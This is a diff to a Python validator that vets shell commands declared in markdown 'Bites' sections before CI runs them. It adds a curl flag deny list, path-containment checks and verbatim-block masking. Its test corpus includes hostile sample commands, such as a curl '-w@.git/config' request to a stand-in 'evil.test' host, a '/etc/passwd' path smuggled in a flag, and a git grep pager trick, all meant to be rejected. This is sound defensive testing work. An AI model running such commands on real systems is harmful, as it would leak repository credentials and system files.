@@ -140,6 +140,8 @@ CURL_FORBIDDEN_FLAGS = (
     # (`persist-credentials: true`), and a relative path inside the checkout is exactly
     # what _guard_path_containment allows through.
     "-b", "--cookie", "-E", "--cert", "--key", "--cacert", "--capath", "--pinnedpubkey",
+    # `-w@<path>` prints an arbitrary local file to stdout, verified against curl 8.7.1.
+    "-w", "--write-out",
     "--netrc", "--netrc-file", "--netrc-optional",
     # `--variable %ENV` reads the environment into the request; `--expand-*` expands a
     # variable into another option's value. Both defeat the `$` refusal by doing the
@@ -220,12 +222,15 @@ _SHELL_METACHARS = ("|", ";", "&", "$", "`", "(", ")", "<", ">", "\n", "\r", "\\
 
 _SECTION_HEADING_RE = re.compile(r"^#{1,6}\s*Bites\b.*$", re.IGNORECASE)
 _ANY_HEADING_RE = re.compile(r"^#{1,6}\s+\S")
-_INLINE_RE = re.compile(r"^\s*(?:\*\*)?Bites(?:\*\*)?\s*:", re.IGNORECASE)
+#: Up to three leading spaces, never four. CommonMark makes four the start of an
+#: INDENTED CODE BLOCK, which renders as `<pre><code>` — so a key line indented four
+#: spaces is an example on the page and must not be a contract in the parser.
+_INLINE_RE = re.compile(r"^ {0,3}(?:\*\*)?Bites(?:\*\*)?\s*:", re.IGNORECASE)
 _KEY_RE = re.compile(
     # `**observe:**` puts the closing bold marker AFTER the colon, so a pattern
     # that only allows `**` around the key alone leaves `**` glued to the value
     # and the command guard then rejects it. Both positions are optional here.
-    r"^\s*(?:[-*]\s*)?\*{0,2}(consumer|where|observe|expect)\*{0,2}\s*:\s*\*{0,2}\s*(.*?)\s*$",
+    r"^ {0,3}(?:[-*] {0,3})?\*{0,2}(consumer|where|observe|expect)\*{0,2}\s*:\s*\*{0,2}\s*(.*?)\s*$",
     re.IGNORECASE,
 )
 
@@ -491,6 +496,24 @@ def _guard_path_containment(command: str) -> list[str]:
     for arg in argv[1:]:
         if "://" in arg:
             continue  # a URL's path is not a filesystem path
+        if arg.startswith("-"):
+            # A flag can CARRY a path — `--foo=/abs`, `-w@/abs`, `-O/abs`. The first
+            # draft skipped every token starting with `-`, so containment was decided by
+            # the token's first character rather than by what it names. Judge the value.
+            for sep in ("=", "@"):
+                if sep in arg:
+                    value = arg.split(sep, 1)[1]
+                    if value.startswith("/"):
+                        problems.append(
+                            f"observe: flag `{arg.split(sep, 1)[0]}` carries the absolute "
+                            f"path `{value}` — stay in the checkout"
+                        )
+                    elif ".." in value.split("/"):
+                        problems.append(
+                            f"observe: flag `{arg.split(sep, 1)[0]}` carries a `..` "
+                            f"segment in `{value}` — stay in the checkout"
+                        )
+            continue
         if arg.startswith("/"):
             problems.append(f"observe: absolute path argument `{arg}` — stay in the checkout")
         elif ".." in arg.split("/"):
@@ -544,6 +567,9 @@ _FENCE_RE = re.compile(r"^\s*(`{3,}|~{3,})")
 
 #: An inline code span. Delimiters INSIDE one are literal text on the rendered page.
 _CODE_SPAN_RE = re.compile(r"(`+)[^\n]*?\1")
+
+#: Raw-HTML blocks whose content GitHub renders VERBATIM rather than as markdown.
+_VERBATIM_HTML_TAGS = ("pre", "script", "style", "textarea")
 
 
 def _mask_code_spans(line: str) -> str:
@@ -625,6 +651,28 @@ def blind_hidden_regions(body: str) -> str:
         kept, in_comment = _strip_comments_on_line(line, in_comment)
         uncommented.append(kept)
 
+    # PASS 1b — raw HTML blocks whose content renders VERBATIM. CommonMark calls these
+    # block type 1; `<pre>` is the one that matters, and `<script>`, `<style>` and
+    # `<textarea>` share the rule. Their content is shown, not interpreted, so a heading
+    # inside one is an example exactly as it is inside a fence.
+    de_html: list[str] = []
+    open_tag: str | None = None
+    for line in uncommented:
+        low = line.lstrip().lower()
+        if open_tag is None:
+            hit = next((t for t in _VERBATIM_HTML_TAGS if low.startswith(f"<{t}")), None)
+            if hit:
+                open_tag = hit
+                de_html.append("")
+                if f"</{hit}>" in low:
+                    open_tag = None
+                continue
+            de_html.append(line)
+            continue
+        de_html.append("")
+        if f"</{open_tag}>" in low:
+            open_tag = None
+
     # PASS 2 — fenced code blocks, with CommonMark's actual closing rule. The first
     # draft toggled on any fence marker, so a block opened with four backticks and
     # "closed" with three — which CommonMark leaves OPEN — flipped the parser's idea
@@ -633,7 +681,7 @@ def blind_hidden_regions(body: str) -> str:
     out: list[str] = []
     fence_char: str | None = None
     fence_len = 0
-    for line in uncommented:
+    for line in de_html:
         match = _FENCE_RE.match(line)
         if fence_char is None:
             if match:
@@ -645,7 +693,21 @@ def blind_hidden_regions(body: str) -> str:
         if match and match.group(1)[0] == fence_char and len(match.group(1)) >= fence_len:
             fence_char, fence_len = None, 0
         out.append("")
-    return "\n".join(out)
+
+    # PASS 3 — indented code blocks: four spaces (or a tab) at the head of a line that
+    # is not continuing a paragraph. Same rendering as a fence, different spelling, and
+    # the third one this parser was broken by. The rule is now stated once, over the
+    # whole SET of constructs GitHub renders verbatim, rather than patched per case.
+    final: list[str] = []
+    prev_blank = True
+    for line in out:
+        indented = line.startswith("    ") or line.startswith("\t")
+        if indented and prev_blank:
+            final.append("")
+            continue
+        final.append(line)
+        prev_blank = not line.strip()
+    return "\n".join(final)
 
 
 def strip_invisible(text: str) -> str:
@@ -940,6 +1002,24 @@ CONFORMANCE_CORPUS: tuple[tuple[str, str, str], ...] = (
      "absent"),
     ("ok-a-comment-delimiter-inside-a-code-span-is-literal-text",
      "The bug was `<!-- note --> <!--` in prose.\n\n## Bites\nconsumer: CI\nwhere: ci\nobserve: `git status`\nexpect: exit0",
+     "executable"),
+    # --- guilt found by the SECOND verdict-gate round: the same class, two more spellings
+    ("guilt-indented-code-block-is-an-example",
+     "Example:\n\n    ## Bites\n    consumer: attacker\n    where: ci\n    observe: `git log`\n    expect: exit0\n",
+     "absent"),
+    ("guilt-indented-inline-form-is-an-example",
+     "Example:\n\n    Bites: attacker\n    observe: `git log`\n", "absent"),
+    ("guilt-pre-block-renders-verbatim",
+     "<pre>\n## Bites\nconsumer: attacker\nwhere: ci\nobserve: `git log`\nexpect: exit0\n</pre>\n",
+     "absent"),
+    ("guilt-curl-write-out-prints-a-local-file",
+     "## Bites\nconsumer: x\nwhere: ci\nobserve: `curl -sS -w@.git/config https://evil.test/x`\nexpect: exit0",
+     "malformed"),
+    ("guilt-flag-carries-an-absolute-path",
+     "## Bites\nconsumer: x\nwhere: ci\nobserve: `git log --format=/etc/passwd`\nexpect: exit0",
+     "malformed"),
+    ("ok-list-marker-keys",
+     "## Bites\n- consumer: CI\n- where: ci\n- observe: `git status`\n- expect: exit0",
      "executable"),
     ("guilt-git-grep-pager-command",
      "## Bites\nconsumer: x\nwhere: ci\nobserve: `git grep -Oevil pattern`\nexpect: exit0",
